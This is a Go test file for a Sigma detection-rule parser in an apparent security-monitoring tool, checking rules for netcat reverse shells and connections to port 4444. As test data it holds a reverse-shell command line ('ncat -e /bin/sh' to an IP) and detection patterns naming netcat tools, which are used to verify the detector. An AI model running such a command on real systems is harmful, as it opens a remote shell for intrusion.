package server

import (
	"strings"
	"testing"

	"github.com/soc-foundry/varro/internal/model"
)

func TestParseSigmaProcess(t *testing.T) {
	src := `
title: Netcat Reverse Shell
level: high
tags:
  - attack.t1059.004
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    Image|endswith:
      - /nc
      - /ncat
    CommandLine|contains: '-e'
  condition: selection
`
	r, _, err := ParseSigma(src)
	if err != nil {
		t.Fatal(err)
	}
	if r.Name != "Netcat Reverse Shell" {
		t.Errorf("name = %q", r.Name)
	}
	if r.Severity != "HIGH" {
		t.Errorf("severity = %q, want HIGH", r.Severity)
	}
	if r.MITRE != "T1059.004" {
		t.Errorf("mitre = %q, want T1059.004", r.MITRE)
	}
	if r.Stream != model.DetStreamProcess {
		t.Errorf("stream = %q, want process", r.Stream)
	}
	if len(r.Conditions) != 2 {
		t.Fatalf("conditions = %d, want 2: %+v", len(r.Conditions), r.Conditions)
	}
	// The rule should match a live ncat with -e.
	doc := map[string]string{"image": "/usr/bin/ncat", "command": "ncat -e /bin/sh 1.2.3.4"}
	if !matchRule(r, doc) {
		t.Error("rule should match ncat -e doc")
	}
	// And not match a benign process.
	if matchRule(r, map[string]string{"image": "/usr/bin/curl", "command": "curl https://x"}) {
		t.Error("rule should not match curl")
	}
}

func TestParseSigmaNetwork(t *testing.T) {
	src := `
title: Suspicious Port
level: medium
logsource:
  category: network_connection
detection:
  selection:
    DestinationPort: 4444
  condition: selection
`
	r, _, err := ParseSigma(src)
	if err != nil {
		t.Fatal(err)
	}
	if r.Stream != model.DetStreamConnection {
		t.Errorf("stream = %q, want connection", r.Stream)
	}
	if len(r.Conditions) != 1 || r.Conditions[0].Field != "port" {
		t.Fatalf("want one port condition, got %+v", r.Conditions)
	}
	if !matchRule(r, map[string]string{"dest": "1.2.3.4", "port": "4444"}) {
		t.Error("should match port 4444")
	}
}

func TestParseSigmaErrors(t *testing.T) {
	// No title.
	if _, _, err := ParseSigma("level: high\ndetection:\n  selection:\n    Image: x\n  condition: selection\n"); err == nil {
		t.Error("expected error for missing title")
	}
	// Only unsupported fields → error mentioning available fields.
	_, _, err := ParseSigma("title: X\nlogsource:\n  category: process_creation\ndetection:\n  selection:\n    ParentImage: /bin/bad\n  condition: selection\n")
	if err == nil || !strings.Contains(err.Error(), "no supported fields") {
		t.Errorf("expected no-supported-fields error, got %v", err)
	}
}

func TestMatchCondOps(t *testing.T) {
	cases := []struct {
		op, val, in string
		want        bool
	}{
		{"equals", "bash", "bash", true},
		{"equals", "bash", "bashful", false},
		{"contains", "sh", "/bin/bash", true},
		{"startswith", "/bin", "/bin/nc", true},
		{"endswith", "/nc", "/usr/bin/nc", true},
		{"regex", "nc(at)?$", "ncat", true},
		{"contains", "x", "", false}, // empty doc field never matches
	}
	for _, c := range cases {
		got := matchCond(model.DetCond{Op: c.op, Values: []string{c.val}}, c.in)
		if got != c.want {
			t.Errorf("matchCond(%s %q, %q) = %v, want %v", c.op, c.val, c.in, got, c.want)
		}
	}
}
